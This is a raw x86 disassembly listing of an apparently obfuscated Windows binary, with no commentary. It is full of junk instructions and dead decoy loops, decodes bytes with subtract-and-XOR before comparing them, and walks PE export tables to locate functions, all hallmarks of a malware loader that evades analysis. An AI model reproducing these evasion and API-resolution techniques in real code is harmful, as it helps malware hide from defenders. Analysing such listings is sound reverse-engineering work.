  423392:	add    DWORD PTR ds:0x42a004,0x5855
  42339c:	mov    esi,DWORD PTR [ebp-0x8]
  42339f:	and    DWORD PTR ds:0x42c018,0x829
  4233a9:	xor    eax,ecx
  4233ab:	adc    DWORD PTR ds:0x42d000,0x54e9
  4233b5:	add    eax,edx
  4233b7:	imul   eax,DWORD PTR [esi]
  4233ba:	mov    esi,DWORD PTR [ebp+0x8]
  4233bd:	xor    esi,ecx
  4233bf:	and    DWORD PTR ds:0x42b014,0x42901c
  4233c9:	add    esi,edx
  4233cb:	cmp    esi,eax
  4233cd:	not    DWORD PTR ds:0x42d018
  4233d3:	mov    eax,DWORD PTR [ebp-0x4]
  4233d6:	mov    DWORD PTR ds:0x42d00c,0x5bdb
  4233e0:	push   ebx
  4233e1:	mov    DWORD PTR ds:0x429014,0x4e26
  4233eb:	je     0x423434
  4233f1:	adc    DWORD PTR ds:0x42b014,ecx
  4233f7:	mov    esi,DWORD PTR [ebp-0x18]
  4233fa:	add    DWORD PTR [eax],esi
  4233fc:	sub    DWORD PTR ds:0x429018,edi
  423402:	mov    eax,DWORD PTR [ebp-0x4]
  423405:	and    DWORD PTR ds:0x429014,0x244e
  42340f:	mov    esi,DWORD PTR [ebp+0xc]
  423412:	xor    esi,ecx
  423414:	adc    DWORD PTR ds:0x42a010,0x1100
  42341e:	add    esi,edx
  423420:	imul   esi,DWORD PTR [eax]
  423423:	mov    DWORD PTR [eax],esi
  423425:	mov    DWORD PTR ds:0x42b008,0x673b
  42342f:	jmp    0x423443
  423434:	adc    DWORD PTR ds:0x42a000,0x51cf
  42343e:	mov    esi,DWORD PTR [ebp+0x14]
  423441:	xor    DWORD PTR [eax],esi
  423443:	mov    eax,DWORD PTR [ebp-0x4]
  423446:	add    DWORD PTR ds:0x42b004,ebx
  42344c:	mov    edi,DWORD PTR [ebp+0x10]
  42344f:	mov    esi,DWORD PTR ds:0x42b014
  423455:	xor    DWORD PTR ds:0x42d010,esi
  42345b:	xor    edi,ecx
  42345d:	mov    esi,0xffcd8d14
  423462:	mov    ebx,esi
  423464:	and    DWORD PTR ds:0x42c004,0x42c010
  42346e:	sub    ebx,edi
  423470:	add    DWORD PTR [eax],ebx
  423472:	movzx  edi,WORD PTR ds:0x42a004
  423479:	adc    DWORD PTR ds:0x42b00c,edi
  42347f:	mov    eax,DWORD PTR [ebp-0x4]
  423482:	or     edi,0x4676
  423488:	mov    edi,DWORD PTR [ebp-0x8]
  42348b:	adc    DWORD PTR ds:0x42b010,0x66f8
  423495:	add    edi,DWORD PTR [eax]
  423497:	mov    DWORD PTR [ebp-0x8],edi
  42349a:	and    DWORD PTR ds:0x429008,0x0
  4234a4:	jmp    0x4234b6
  4234a9:	mov    edi,DWORD PTR ds:0x429008
  4234af:	inc    edi
  4234b0:	mov    DWORD PTR ds:0x429008,edi
  4234b6:	cmp    DWORD PTR ds:0x429008,0x1e
  4234bd:	jae    0x42351c
  4234c3:	cmp    DWORD PTR ds:0x429008,0xe
  4234ca:	jbe    0x42351c
  4234d0:	jmp    0x4234fb
  4234d5:	push   DWORD PTR [ebp-0x10]
  4234d8:	push   DWORD PTR [ebp-0x10]
  4234db:	push   0x1905
  4234e0:	push   0x5e48
  4234e5:	push   DWORD PTR [ebp-0x14]
  4234e8:	push   DWORD PTR [ebp-0xc]
  4234eb:	push   0x1ad8
  4234f0:	push   0x42f0bb
  4234f5:	call   DWORD PTR ds:0x430047
  4234fb:	cmp    DWORD PTR ds:0x429008,0xd
  423502:	jne    0x423517
  423508:	xor    edi,edi
  42350a:	or     edi,DWORD PTR ds:0x429008
  423510:	inc    edi
  423511:	mov    DWORD PTR ds:0x429008,edi
  423517:	jmp    0x4234a9
  42351c:	mov    eax,DWORD PTR [ebp+0xc]
  42351f:	mov    edi,DWORD PTR [ebp+0xc]
  423522:	and    DWORD PTR ds:0x429028,0x2929
  42352c:	xor    edi,ecx
  42352e:	sbb    DWORD PTR ds:0x42c000,0x429018
  423538:	xor    eax,ecx
  42353a:	lea    eax,[eax+edi*1+0x64e5d8]
  423541:	xor    edi,DWORD PTR ds:0x42b008
  423547:	mov    edi,DWORD PTR [ebp+0xc]
  42354a:	xor    edi,ecx
  42354c:	add    edi,edx
  42354e:	imul   eax,edi
  423551:	mov    edi,DWORD PTR [ebp+0xc]
  423554:	xor    edi,ecx
  423556:	sub    edi,eax
  423558:	mov    eax,DWORD PTR [ebp-0x4]
  42355b:	add    edi,edx
  42355d:	cmp    DWORD PTR [eax],edi
  42355f:	mov    eax,DWORD PTR [ebp-0x4]
  423562:	mov    edi,DWORD PTR [ebp+0x10]
  423565:	jg     0x423578
  42356b:	xor    edi,ecx
  42356d:	mov    ebx,esi
  42356f:	sub    ebx,edi
  423571:	add    DWORD PTR [eax],ebx
  423573:	jmp    0x42357e
  423578:	xor    edi,ecx
  42357a:	add    edi,edx
  42357c:	add    DWORD PTR [eax],edi
  42357e:	mov    eax,DWORD PTR [ebp-0x8]
  423581:	mov    edi,DWORD PTR [ebp-0x10]
  423584:	mov    eax,DWORD PTR [eax]
  423586:	xor    edi,ecx
  423588:	add    edi,0x3272eb
  42358e:	not    edi
  423590:	and    eax,edi
  423592:	movsx  di,BYTE PTR [eax+0x1]
  423597:	mov    ebx,0x3b56
  42359c:	sub    di,bx
  42359f:	mov    ebx,0x8a94
  4235a4:	xor    di,bx
  4235a7:	mov    ebx,0x4f90
  4235ac:	cmp    di,bx
  4235af:	jne    0x4235d7
  4235b5:	movsx  di,BYTE PTR [eax]
  4235b9:	mov    ebx,0x3b56
  4235be:	sub    di,bx
  4235c1:	mov    ebx,0x8a94
  4235c6:	xor    di,bx
  4235c9:	mov    ebx,0x4e63
  4235ce:	cmp    di,bx
  4235d1:	je     0x4235e7
  4235d7:	mov    edi,DWORD PTR [ebp-0x10]
  4235da:	xor    edi,ecx
  4235dc:	mov    ebx,esi
  4235de:	sub    ebx,edi
  4235e0:	add    eax,ebx
  4235e2:	jmp    0x423592
  4235e7:	mov    esi,DWORD PTR [ebp-0x14]
  4235ea:	mov    esi,DWORD PTR [esi]
  4235ec:	mov    edi,DWORD PTR [eax+0x3c]
  4235ef:	lea    esi,[edi+esi*8+0x78]
  4235f3:	mov    esi,DWORD PTR [esi+eax*1]
  4235f6:	mov    DWORD PTR [ebp-0x8],esi
  4235f9:	mov    esi,DWORD PTR [ebp+0x8]
  4235fc:	xor    esi,ecx
  4235fe:	add    esi,edx
  423600:	mov    DWORD PTR [ebp-0x14],esi
  423603:	mov    esi,DWORD PTR [ebp+0x8]
  423606:	mov    edi,DWORD PTR [ebp-0x8]
  423609:	xor    esi,ecx
  42360b:	add    esi,edx
  42360d:	pop    ebx
  42360e:	cmp    edi,esi
  423610:	jne    0x42362e
  423616:	mov    eax,DWORD PTR [ebp+0xc]
  423619:	xor    eax,ecx
  42361b:	mov    ecx,DWORD PTR [ebp-0x8]
  42361e:	add    eax,edx
  423620:	imul   eax,ecx
  423623:	mov    DWORD PTR [ebp-0x8],eax
  423626:	push   DWORD PTR [ebp+0x18]
  423629:	jmp    0x423682
  42362e:	mov    ecx,DWORD PTR [ebp-0x8]
  423631:	add    ecx,eax
  423633:	mov    DWORD PTR [ebp-0x14],ecx
  423636:	mov    ecx,DWORD PTR [ebp-0x14]
  423639:	mov    ecx,DWORD PTR [ecx+0xc]
  42363c:	movsx  cx,BYTE PTR [ecx+eax*1]
  423641:	mov    edx,0x3b56
  423646:	sub    cx,dx
  423649:	mov    edx,0x8a94
  42364e:	xor    cx,dx
  423651:	mov    edx,0x4e61
  423656:	cmp    cx,dx
  423659:	jne    0x423626
  42365f:	mov    ecx,DWORD PTR ds:0x42f36b
  423665:	mov    ecx,DWORD PTR [ecx+0x198]
  42366b:	mov    DWORD PTR [ecx],eax
  42366d:	jmp    0x423693
  423672:	mov    ecx,DWORD PTR [ebp+0x18]
  423675:	cmp    ecx,0xf89c85b1
  42367b:	jne    0x423693
  423681:	push   eax
  423682:	push   DWORD PTR [ebp+0x14]
  423685:	push   DWORD PTR [ebp+0x10]
  423688:	push   DWORD PTR [ebp+0xc]
  42368b:	push   DWORD PTR [ebp+0x8]
  42368e:	call   0x423191
  423693:	pop    edi
  423694:	pop    esi
  423695:	leave  
  423696:	ret    0x14
  423699:	push   ebp
  42369a:	mov    ebp,esp
  42369c:	sub    esp,0x70
  42369f:	push   edi
  4236a0:	push   0x42f47b
  4236a5:	and    DWORD PTR ds:0x42d004,0x1ec1
  4236af:	call   DWORD PTR ds:0x43002f
  4236b5:	mov    edi,DWORD PTR ds:0x42d014
  4236bb:	sbb    DWORD PTR ds:0x42b014,edi
  4236c1:	mov    edi,DWORD PTR ds:0x43004f
  4236c7:	sbb    DWORD PTR ds:0x42a014,0x42c000
  4236d1:	push   0x42f49b
  4236d6:	call   edi
  4236d8:	adc    DWORD PTR ds:0x429004,0x5ead
  4236e2:	test   eax,eax
  4236e4:	je     0x423726
  4236ea:	push   0x0
  4236ec:	adc    DWORD PTR ds:0x42d000,0x42c004
  4236f6:	push   0x0
  4236f8:	add    DWORD PTR ds:0x42b008,0x118d
  423702:	push   0x42f50b
  423707:	and    DWORD PTR ds:0x42900c,0x1fff
  423711:	call   DWORD PTR ds:0x43001f
  423717:	mov    DWORD PTR ds:0x42a01c,0x2e2c
  423721:	jmp    0x42460e
  423726:	push   esi
  423727:	xor    esi,esi
  423729:	or     esi,DWORD PTR ds:0x42c000
  42372f:	sub    esi,DWORD PTR ds:0x42901c
  423735:	mov    DWORD PTR ds:0x42c000,esi
  42373b:	mov    esi,DWORD PTR ds:0x430043
  423741:	add    DWORD PTR ds:0x429024,0x42a000
  42374b:	lea    eax,[ebp-0x70]
  42374e:	push   eax
  42374f:	xor    DWORD PTR ds:0x42b010,0x42a00c
  423759:	push   0x42f4d7
  42375e:	dec    DWORD PTR ds:0x42900c
  423764:	call   esi
  423766:	test   eax,eax
  423768:	mov    DWORD PTR ds:0x42b018,0x2e12
  423772:	je     0x42378c
  423778:	push   0x42f54b
  42377d:	mov    DWORD PTR ds:0x42c014,0x3c92
  423787:	jmp    0x423827
  42378c:	sbb    DWORD PTR ds:0x429020,0x6e1f
  423796:	push   0x42f563
  42379b:	call   edi
  42379d:	test   eax,eax
  42379f:	mov    DWORD PTR ds:0x42b010,0x136e
  4237a9:	je     0x4237d7
  4237af:	adc    DWORD PTR ds:0x42c010,0x42a008
  4237b9:	push   0x0
  4237bb:	push   0x0
  4237bd:	push   0x42f5d3
  4237c2:	add    DWORD PTR ds:0x42b004,0x42c014
  4237cc:	call   DWORD PTR ds:0x43001f
  4237d2:	jmp    0x42460d
  4237d7:	xor    DWORD PTR ds:0x429014,0x61d8
  4237e1:	lea    eax,[ebp-0x70]
  4237e4:	sbb    DWORD PTR ds:0x42c01c,0x42d004
  4237ee:	push   eax
  4237ef:	neg    DWORD PTR ds:0x42c018
  4237f5:	push   0x42f59f
  4237fa:	call   esi
  4237fc:	sbb    DWORD PTR ds:0x429020,0x42a000
  423806:	test   eax,eax
  423808:	mov    DWORD PTR ds:0x42b014,0x3bd8
  423812:	je     0x42383c
  423818:	or     DWORD PTR ds:0x42a000,0x5797
  423822:	push   0x42f613
  423827:	sub    DWORD PTR ds:0x429020,0x7429
  423831:	call   DWORD PTR ds:0x430023
  423837:	jmp    0x42460d
  42383c:	mov    DWORD PTR [ebp-0x2c],0x0
  423843:	mov    eax,ds:0x42d018
  423848:	sbb    eax,DWORD PTR ds:0x42c018
  42384e:	mov    ds:0x42d018,eax
  423853:	mov    eax,DWORD PTR [ebp-0x20]
  423856:	mov    DWORD PTR [ebp-0x20],eax
  423859:	mov    DWORD PTR ds:0x42a004,0x1b
  423863:	cmp    DWORD PTR ds:0x42a004,0x0
  42386a:	je     0x4238c1
  423870:	cmp    DWORD PTR ds:0x42a004,0x2
  423877:	jbe    0x4238c1
  42387d:	jmp    0x423893
  423882:	push   DWORD PTR [ebp-0x28]
  423885:	push   0x7240
  42388a:	push   DWORD PTR [ebp-0x1c]
  42388d:	call   DWORD PTR ds:0x43004b
  423893:	cmp    DWORD PTR ds:0x42a004,0x3
  42389a:	jne    0x4238af
  4238a0:	xor    edx,edx
  4238a2:	add    edx,DWORD PTR ds:0x42a004
  4238a8:	dec    edx
  4238a9:	mov    DWORD PTR ds:0x42a004,edx
  4238af:	mov    edx,DWORD PTR ds:0x42a004
  4238b5:	dec    edx
  4238b6:	mov    DWORD PTR ds:0x42a004,edx
  4238bc:	jmp    0x423863
  4238c1:	mov    ecx,0xf89c85b0
  4238c6:	mov    DWORD PTR [ebp-0x4],ecx
  4238c9:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4238d0:	lea    eax,[ebp-0x14]
  4238d3:	adc    edi,edi
  4238d5:	mov    DWORD PTR [ebp-0x2c],eax
  4238d8:	lea    eax,[ebp-0x18]
  4238db:	sbb    edi,0x185f
  4238e1:	mov    DWORD PTR [ebp-0x24],eax
  4238e4:	inc    edi
  4238e5:	mov    eax,ds:0x42f36b
  4238ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4238f0:	add    DWORD PTR ds:0x42b014,edi
  4238f6:	mov    eax,DWORD PTR [eax]
  4238f8:	mov    edx,DWORD PTR [ebp-0x24]
  4238fb:	mov    edi,0x75108a4
  423900:	mov    DWORD PTR ds:0x42b004,0x30ab
  42390a:	xor    eax,edi
  42390c:	sbb    DWORD PTR ds:0x42c000,0x429024
  423916:	push   ebx
  423917:	sub    ebx,0x6eba
  42391d:	mov    ebx,0x3272ec
  423922:	adc    DWORD PTR ds:0x42d018,0x42c01c
  42392c:	add    eax,ebx
  42392e:	mov    DWORD PTR ds:0x42d008,0x4b8b
  423938:	mov    DWORD PTR [edx],eax
  42393a:	mov    eax,0x64e4
  42393f:	mov    eax,ds:0x42fed3
  423944:	cmp    eax,0x434cdbf8
  423949:	jne    0x423a61
  42394f:	mov    eax,DWORD PTR [ebp-0x4]
  423952:	inc    DWORD PTR ds:0x429014
  423958:	mov    edx,DWORD PTR ds:0x42f36b
  42395e:	and    DWORD PTR ds:0x429024,0x0
  423968:	mov    esi,DWORD PTR ds:0x429024
  42396e:	inc    esi
  42396f:	mov    DWORD PTR ds:0x429024,esi
  423975:	cmp    DWORD PTR ds:0x429024,0xa
  42397c:	jg     0x4239be
  423982:	jmp    0x423997
  423987:	push   0x42c018
  42398c:	push   0x42f19b
  423991:	call   DWORD PTR ds:0x43000b
  423997:	cmp    DWORD PTR ds:0x429024,0x9
  42399e:	jne    0x4239b1
  4239a4:	mov    esi,DWORD PTR ds:0x429024
  4239aa:	inc    esi
  4239ab:	mov    DWORD PTR ds:0x429024,esi
  4239b1:	cmp    DWORD PTR ds:0x429024,0x12
  4239b8:	jb     0x423968
  4239be:	mov    edx,DWORD PTR [edx+0x198]
  4239c4:	and    DWORD PTR ds:0x429008,edx
  4239ca:	xor    eax,edi
  4239cc:	or     esi,DWORD PTR ds:0x42901c
  4239d2:	add    eax,ebx
  4239d4:	xor    esi,0x27f0
  4239da:	mov    DWORD PTR [edx],eax
  4239dc:	mov    eax,ds:0x42b01c
  4239e1:	adc    eax,DWORD PTR ds:0x42a008
  4239e7:	mov    ds:0x42b01c,eax
  4239ec:	mov    eax,DWORD PTR [ebp-0x4]
  4239ef:	sbb    esi,0x278
  4239f5:	xor    eax,edi
  4239f7:	mov    DWORD PTR ds:0x42a004,0x14
  423a01:	cmp    DWORD PTR ds:0x42a004,0x0
  423a08:	je     0x423a5a
  423a0e:	cmp    DWORD PTR ds:0x42a004,0x3
  423a15:	ja     0x423a5a
  423a1b:	jmp    0x423a2e
  423a20:	push   0x42d01c
  423a25:	push   DWORD PTR [ebp-0x20]
  423a28:	call   DWORD PTR ds:0x43000f
  423a2e:	cmp    DWORD PTR ds:0x42a004,0x4
  423a35:	jne    0x423a48
  423a3b:	mov    esi,DWORD PTR ds:0x42a004
  423a41:	dec    esi
  423a42:	mov    DWORD PTR ds:0x42a004,esi
  423a48:	mov    esi,DWORD PTR ds:0x42a004
  423a4e:	dec    esi
  423a4f:	mov    DWORD PTR ds:0x42a004,esi
  423a55:	jmp    0x423a01
  423a5a:	add    eax,ebx
  423a5c:	mov    ds:0x42fed3,eax
  423a61:	movzx  eax,WORD PTR ds:0x42d008
  423a68:	and    DWORD PTR ds:0x429028,eax
  423a6e:	mov    eax,ds:0x42f36b
  423a73:	mov    eax,DWORD PTR [eax+0x18c]
  423a79:	adc    DWORD PTR ds:0x429014,0x7baf
  423a83:	mov    eax,DWORD PTR [eax]
  423a85:	mov    DWORD PTR ds:0x42b004,0x12
  423a8f:	cmp    DWORD PTR ds:0x42b004,0x0
  423a96:	je     0x423ae0
  423a9c:	cmp    DWORD PTR ds:0x42b004,0x5
  423aa3:	ja     0x423ae0
  423aa9:	jmp    0x423ab4
  423aae:	call   DWORD PTR ds:0x430013
  423ab4:	cmp    DWORD PTR ds:0x42b004,0x6
  423abb:	jne    0x423ace
  423ac1:	mov    esi,DWORD PTR ds:0x42b004
  423ac7:	dec    esi
  423ac8:	mov    DWORD PTR ds:0x42b004,esi
  423ace:	mov    esi,DWORD PTR ds:0x42b004
  423ad4:	dec    esi
  423ad5:	mov    DWORD PTR ds:0x42b004,esi
  423adb:	jmp    0x423a8f
  423ae0:	mov    DWORD PTR [ebp-0x34],eax
  423ae3:	and    DWORD PTR ds:0x42900c,0x0
  423aed:	jmp    0x423aff
  423af2:	mov    esi,DWORD PTR ds:0x42900c
  423af8:	inc    esi
  423af9:	mov    DWORD PTR ds:0x42900c,esi
  423aff:	cmp    DWORD PTR ds:0x42900c,0x1b
  423b06:	jae    0x423b4f
  423b0c:	cmp    DWORD PTR ds:0x42900c,0xb
  423b13:	jl     0x423b4f
  423b19:	jmp    0x423b2e
  423b1e:	push   0x42f14f
  423b23:	push   0x1
  423b25:	push   DWORD PTR [ebp-0x24]
  423b28:	call   DWORD PTR ds:0x430017
  423b2e:	cmp    DWORD PTR ds:0x42900c,0xa
  423b35:	jne    0x423b4a
  423b3b:	xor    esi,esi
  423b3d:	add    esi,DWORD PTR ds:0x42900c
  423b43:	inc    esi
  423b44:	mov    DWORD PTR ds:0x42900c,esi
  423b4a:	jmp    0x423af2
  423b4f:	mov    eax,0xf89c85bc
  423b54:	or     DWORD PTR ds:0x42b000,ecx
  423b5a:	mov    DWORD PTR [ebp-0x24],eax
  423b5d:	mov    DWORD PTR [ebp-0x24],eax
  423b60:	xor    DWORD PTR ds:0x42d018,ecx
  423b66:	mov    DWORD PTR [ebp-0x24],eax
  423b69:	dec    esi
  423b6a:	mov    DWORD PTR [ebp-0x24],ecx
  423b6d:	or     esi,DWORD PTR ds:0x42c000
  423b73:	mov    DWORD PTR [ebp-0x38],eax
  423b76:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  423b7d:	adc    DWORD PTR ds:0x42901c,ecx
  423b83:	mov    esi,DWORD PTR [ebp-0x4]
  423b86:	sbb    DWORD PTR ds:0x429004,0x42b01c
  423b90:	xor    esi,edi
  423b92:	add    esi,ebx
  423b94:	jmp    0x423ce3
  423b99:	mov    eax,DWORD PTR [ebp-0x8]
  423b9c:	add    DWORD PTR ds:0x42b008,0x42d014
  423ba6:	xor    eax,edi
  423ba8:	sub    DWORD PTR ds:0x429004,0x42b014
  423bb2:	lea    eax,[eax+esi*1+0x3272ec]
  423bb9:	and    DWORD PTR ds:0x42d00c,0x42a00c
  423bc3:	push   eax
  423bc4:	mov    DWORD PTR ds:0x42c018,0x956
  423bce:	mov    eax,DWORD PTR [ebp-0x24]
  423bd1:	add    DWORD PTR ds:0x42b018,0x42d004
  423bdb:	xor    eax,edi
  423bdd:	and    DWORD PTR ds:0x42d010,0x42b01c
  423be7:	lea    eax,[ebp+eax*1+0x3272f4]
  423bee:	xor    DWORD PTR ds:0x42b018,0x429018
  423bf8:	push   eax
  423bf9:	adc    DWORD PTR ds:0x42a014,0x1370
  423c03:	mov    eax,ds:0x42f36b
  423c08:	add    DWORD PTR ds:0x42d014,0xcb6
  423c12:	push   DWORD PTR [eax+0x1bc]
  423c18:	call   0x424613
  423c1d:	and    DWORD PTR ds:0x429004,0x0
  423c27:	mov    eax,ds:0x429004
  423c2c:	inc    eax
  423c2d:	mov    ds:0x429004,eax
  423c32:	cmp    DWORD PTR ds:0x429004,0x7
  423c39:	jl     0x423c8e
  423c3f:	jmp    0x423c69
  423c44:	push   0x50e0
  423c49:	push   DWORD PTR [ebp-0x10]
  423c4c:	push   0x429008
  423c51:	push   DWORD PTR [ebp-0x18]
  423c54:	push   0x60f5
  423c59:	push   0x7920
  423c5e:	push   0x2e0e
  423c63:	call   DWORD PTR ds:0x43001b
  423c69:	cmp    DWORD PTR ds:0x429004,0x6
  423c70:	jne    0x423c81
  423c76:	mov    eax,ds:0x429004
  423c7b:	inc    eax
  423c7c:	mov    ds:0x429004,eax
  423c81:	cmp    DWORD PTR ds:0x429004,0x11
  423c88:	jb     0x423c27
  423c8e:	mov    eax,DWORD PTR [ebp-0x8]
  423c91:	xor    eax,edi
  423c93:	mov    DWORD PTR ds:0x42d004,0x15
  423c9d:	cmp    DWORD PTR ds:0x42d004,0x0
  423ca4:	je     0x423cdc
  423caa:	cmp    DWORD PTR ds:0x42d004,0x20
  423cb1:	jle    0x423cdc
  423cb7:	jmp    0x423cc8
  423cbc:	push   DWORD PTR [ebp-0x1c]
  423cbf:	push   DWORD PTR [ebp-0x14]
  423cc2:	call   DWORD PTR ds:0x430027
  423cc8:	xor    ecx,ecx
  423cca:	add    ecx,DWORD PTR ds:0x42d004
  423cd0:	dec    ecx
  423cd1:	mov    DWORD PTR ds:0x42d004,ecx
  423cd7:	jmp    0x423c9d
  423cdc:	lea    esi,[esi+eax*1+0x3272ec]
  423ce3:	neg    eax
  423ce5:	mov    eax,DWORD PTR [ebp-0x8]
  423ce8:	adc    DWORD PTR ds:0x42d000,0x333b
  423cf2:	mov    ecx,DWORD PTR [ebp-0x8]
  423cf5:	xor    DWORD PTR ds:0x42d014,0x42a014
  423cff:	xor    ecx,edi
  423d01:	and    DWORD PTR ds:0x42d00c,0x42b018
  423d0b:	xor    eax,edi
  423d0d:	add    eax,ecx
  423d0f:	mov    ecx,DWORD PTR [ebp-0x8]
  423d12:	and    DWORD PTR ds:0x42a008,0x42d00c
  423d1c:	xor    ecx,edi
  423d1e:	mov    DWORD PTR ds:0x42b008,0x48ca
  423d28:	lea    eax,[eax+ecx*1+0x9758c4]
  423d2f:	mov    DWORD PTR ds:0x42a01c,0x2b5
  423d39:	cmp    esi,eax
  423d3b:	mov    DWORD PTR ds:0x42b01c,0x6741
  423d45:	jbe    0x423b99
  423d4b:	mov    eax,DWORD PTR [ebp+0xc]
  423d4e:	mov    ds:0x42f1ef,eax
  423d53:	sub    ecx,ecx
  423d55:	mov    eax,DWORD PTR [ebp+0x10]
  423d58:	sub    ecx,DWORD PTR ds:0x42d018
  423d5e:	mov    ds:0x42f443,eax
  423d63:	mov    eax,ds:0x42f1ef
  423d68:	or     DWORD PTR ds:0x42c008,ebx
  423d6e:	mov    ecx,DWORD PTR [ebp-0x2c]
  423d71:	add    DWORD PTR ds:0x429014,0xb75
  423d7b:	sub    eax,ebx
  423d7d:	add    DWORD PTR ds:0x42b000,0x59bf
  423d87:	xor    eax,edi
  423d89:	mov    DWORD PTR ds:0x42c014,0x601c
  423d93:	mov    DWORD PTR [ecx],eax
  423d95:	not    eax
  423d97:	mov    eax,DWORD PTR [ebp-0x20]
  423d9a:	mov    DWORD PTR ds:0x429000,0x4eb8
  423da4:	cmp    eax,0xf89c85b0
  423da9:	jne    0x4241a8
  423daf:	xor    DWORD PTR ds:0x42a004,0x4e87
  423db9:	lea    eax,[ebp-0x10]
  423dbc:	mov    DWORD PTR [ebp-0x40],eax
  423dbf:	sbb    DWORD PTR ds:0x42900c,0x429018
  423dc9:	lea    eax,[ebp+0x4]
  423dcc:	mov    DWORD PTR [ebp-0x10],eax
  423dcf:	or     DWORD PTR ds:0x42c000,0x26f1
  423dd9:	mov    eax,DWORD PTR [ebp-0x10]
  423ddc:	test   eax,eax
  423dde:	je     0x424565
  423de4:	add    DWORD PTR ds:0x42b00c,0x193f
  423dee:	push   0x42f62b
  423df3:	call   DWORD PTR ds:0x43004f
  423df9:	add    DWORD PTR ds:0x42c010,0x3f0d
  423e03:	test   eax,eax
  423e05:	mov    DWORD PTR ds:0x42c010,0x4f7a
  423e0f:	je     0x423e2d
  423e15:	push   0x0
  423e17:	push   0x0
  423e19:	mov    DWORD PTR ds:0x42b00c,0x5e6e
  423e23:	push   0x42f69b
  423e28:	jmp    0x4245d9
  423e2d:	or     DWORD PTR ds:0x42d004,0x382d
  423e37:	lea    eax,[ebp-0x70]
  423e3a:	add    DWORD PTR ds:0x42d004,0x42b01c
  423e44:	push   eax
  423e45:	xor    DWORD PTR ds:0x42b00c,0x6609
  423e4f:	push   0x42f667
  423e54:	or     DWORD PTR ds:0x42d000,0x2f88
  423e5e:	call   DWORD PTR ds:0x430043
  423e64:	or     DWORD PTR ds:0x429000,0x1a50
  423e6e:	test   eax,eax
  423e70:	je     0x423e94
  423e76:	mov    DWORD PTR ds:0x42c008,0x985
  423e80:	push   0x42f6db
  423e85:	mov    DWORD PTR ds:0x42b000,0x1ac7
  423e8f:	jmp    0x4245fc
  423e94:	and    DWORD PTR ds:0x42b008,0x0
  423e9e:	jmp    0x423eb2
  423ea3:	xor    esi,esi
  423ea5:	xor    esi,DWORD PTR ds:0x42b008
  423eab:	inc    esi
  423eac:	mov    DWORD PTR ds:0x42b008,esi
  423eb2:	cmp    DWORD PTR ds:0x42b008,0x1c
  423eb9:	jae    0x423ee4
  423ebf:	cmp    DWORD PTR ds:0x42b008,0x27
  423ec6:	jbe    0x423ee4
  423ecc:	jmp    0x423edf
  423ed1:	push   DWORD PTR [ebp-0x24]
  423ed4:	push   0x545e
  423ed9:	call   DWORD PTR ds:0x43002b
  423edf:	jmp    0x423ea3
  423ee4:	mov    eax,DWORD PTR [ebp-0xc]
  423ee7:	not    eax
  423ee9:	mov    eax,DWORD PTR [ebp-0x8]
  423eec:	sbb    DWORD PTR ds:0x429018,0x42d000
  423ef6:	mov    eax,DWORD PTR [ebp-0x4]
  423ef9:	mov    DWORD PTR ds:0x429014,0x18
  423f03:	cmp    DWORD PTR ds:0x429014,0x0
  423f0a:	je     0x423f49
  423f10:	cmp    DWORD PTR ds:0x429014,0x23
  423f17:	jbe    0x423f49
  423f1d:	jmp    0x423f37
  423f22:	push   0x8e6d
  423f27:	push   0x42a018
  423f2c:	push   0x42f09c
  423f31:	call   DWORD PTR ds:0x430033
  423f37:	mov    ecx,DWORD PTR ds:0x429014
  423f3d:	dec    ecx
  423f3e:	mov    DWORD PTR ds:0x429014,ecx
  423f44:	jmp    0x423f03
  423f49:	mov    DWORD PTR [ebp+0xc],eax
  423f4c:	xor    ecx,ecx
  423f4e:	or     ecx,DWORD PTR ds:0x424aa4
  423f54:	mov    ecx,DWORD PTR [ecx]
  423f56:	sbb    DWORD PTR ds:0x429014,ecx
  423f5c:	mov    eax,eax
  423f5e:	mov    eax,ds:0x42f36b
  423f63:	mov    eax,DWORD PTR [eax+0x1c8]
  423f69:	not    DWORD PTR ds:0x42c01c
  423f6f:	mov    eax,DWORD PTR [eax]
  423f71:	add    DWORD PTR ds:0x429024,ebx
  423f77:	cdq    
  423f78:	mov    esi,0xfabdbedd
  423f7d:	dec    ecx
  423f7e:	add    eax,esi
  423f80:	mov    ecx,0x2e63
  423f85:	adc    edx,0xffffffff
  423f88:	and    DWORD PTR [ebp-0x38],0x0
  423f8c:	and    DWORD PTR ds:0x42d000,0x0
  423f96:	jmp    0x423fa8
  423f9b:	mov    ecx,DWORD PTR ds:0x42d000
  423fa1:	inc    ecx
  423fa2:	mov    DWORD PTR ds:0x42d000,ecx
  423fa8:	cmp    DWORD PTR ds:0x42d000,0x11
  423faf:	jae    0x423ff6
  423fb5:	cmp    DWORD PTR ds:0x42d000,0x7
  423fbc:	jb     0x423ff6
  423fc2:	jmp    0x423fd5
  423fc7:	push   0x182f
  423fcc:	push   DWORD PTR [ebp-0x20]
  423fcf:	call   DWORD PTR ds:0x430037
  423fd5:	cmp    DWORD PTR ds:0x42d000,0x6
  423fdc:	jne    0x423ff1
  423fe2:	xor    ecx,ecx
  423fe4:	add    ecx,DWORD PTR ds:0x42d000
  423fea:	inc    ecx
  423feb:	mov    DWORD PTR ds:0x42d000,ecx
  423ff1:	jmp    0x423f9b
  423ff6:	xor    edx,0x0
  423ff9:	and    DWORD PTR ds:0x42d010,0x0
  424003:	jmp    0x424015
  424008:	mov    ecx,DWORD PTR ds:0x42d010
  42400e:	inc    ecx
  42400f:	mov    DWORD PTR ds:0x42d010,ecx
  424015:	cmp    DWORD PTR ds:0x42d010,0x17
  42401c:	jae    0x424049
  424022:	cmp    DWORD PTR ds:0x42d010,0x26
  424029:	jl     0x424049
  42402f:	jmp    0x424044
  424034:	push   0x42f181
  424039:	push   0x0
  42403b:	push   DWORD PTR [ebp-0x20]
  42403e:	call   DWORD PTR ds:0x43003b
  424044:	jmp    0x424008
  424049:	mov    DWORD PTR [ebp-0x24],edx
  42404c:	mov    DWORD PTR ds:0x42b000,0x1d
  424056:	cmp    DWORD PTR ds:0x42b000,0x0
  42405d:	je     0x4240aa
  424063:	cmp    DWORD PTR ds:0x42b000,0xb
  42406a:	jbe    0x4240aa
  424070:	jmp    0x42407e
  424075:	push   DWORD PTR [ebp-0x20]
  424078:	call   DWORD PTR ds:0x43003f
  42407e:	cmp    DWORD PTR ds:0x42b000,0xc
  424085:	jne    0x424098
  42408b:	mov    edx,DWORD PTR ds:0x42b000
  424091:	dec    edx
  424092:	mov    DWORD PTR ds:0x42b000,edx
